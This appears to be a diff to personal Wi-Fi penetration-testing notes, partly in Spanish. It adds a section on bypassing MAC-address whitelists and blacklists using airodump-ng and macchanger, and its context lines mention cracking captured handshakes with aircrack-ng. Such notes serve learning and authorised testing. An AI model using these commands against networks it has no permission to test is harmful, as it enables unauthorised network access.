@@ -202,6 +202,23 @@ aircrack-ng (.cap file) -w (worldlist .txt)
 ```
 Hay empresas online donde puedes subir el handshake y ellos te lo analizan
 
+## Bypassing Mac Filtering (Blacklists & Whitelists)
+- Whitelists
+```
+1 Discover the conected witelisted clients
+airodump-ng --bssid (BSSID) --channel (Nº) mon0
+2. Change you mac to that witelisted mac (go Manage mode)
+ifconfig wlan0 down
+macchanger -m [Mac from Whitelist] wlan0
+ifconfig wlan0 up
+```
+- Blacklists
+```
+ifconfig wlan0 down
+macchanger -r wlan0
+ifconfig wlan0 up
+```
+
 ## Discovering Hidden Networks
 ```
 1. We can see all info runing airdump but not the name
